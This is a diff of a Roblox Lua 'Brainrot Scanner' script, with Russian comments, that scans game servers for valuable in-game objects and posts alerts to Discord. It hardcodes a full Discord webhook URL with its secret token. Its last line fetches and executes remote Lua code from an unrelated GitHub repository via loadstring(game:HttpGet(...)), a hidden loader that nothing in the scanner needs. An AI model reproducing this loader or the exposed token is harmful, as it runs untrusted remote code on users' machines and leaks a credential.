@@ -8,8 +8,7 @@ local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
 local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
-local DISCORD_WEBHOOK_URL =
-    'https://discord.com/api/webhooks/1422290103522431048/d2JA2afCOlJXJOVBaEoaAWrx3p6fIxKDw6UvjbIbKDLiwpBZ0H-SZbrG8wthxYXobeJ2'
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1422290103522431048/d2JA2afCOlJXJOVBaEoaAWrx3p6fIxKDw6UvjbIbKDLiwpBZ0H-SZbrG8wthxYXobeJ2'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
@@ -53,7 +52,7 @@ local OBJECTS = {
     ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
     ['Tang Tang Keletang'] = { emoji = '📢', important = true },
     ['Money Money Puggy'] = { emoji = '🐶', important = true },
-    ['Chillin Chili'] = { emoji = '🌶', important = true },
+    ['Ta Ta Ta Ta Sahur'] = { emoji = '😉', important = true },
 }
 
 -- Создаем список важных объектов
@@ -64,14 +63,20 @@ for name, cfg in pairs(OBJECTS) do
     end
 end
 
--- 💰 ПАРСЕР ДОХОДА
+-- 💰 ПАРСЕР ДОХОДА: принимаем только строки, оканчивающиеся на "/s"
+-- С суффиксом масштаба (K/M/B) в любом регистре или без него.
 local function parseGenerationText(s)
     if type(s) ~= 'string' or s == '' then
         return nil
     end
-    s = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
-    local num, suffix = s:match('([%-%d%.]+)%s*([KMBkmb]?)')
-    local val = tonumber(num or '')
+    -- Нормализация: убираем $, запятые и пробелы
+    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
+    -- Форматы: 10/s, 2.5M/s, 750k/s, 1b/s
+    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
+    if not num then
+        return nil
+    end
+    local val = tonumber(num)
     if not val then
         return nil
     end
@@ -546,11 +551,6 @@ UserInputService.InputBegan:Connect(function(input, gpe)
     end
 end)
 
-print(
-    '💡 Нажмите F для повторного сканирования'
-)
-print(
-    '📱 Discord webhook готов к отправке уведомлений'
-)
-
+print('💡 Нажмите F для повторного сканирования')
+print('📱 Discord webhook готов к отправке уведомлений')
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
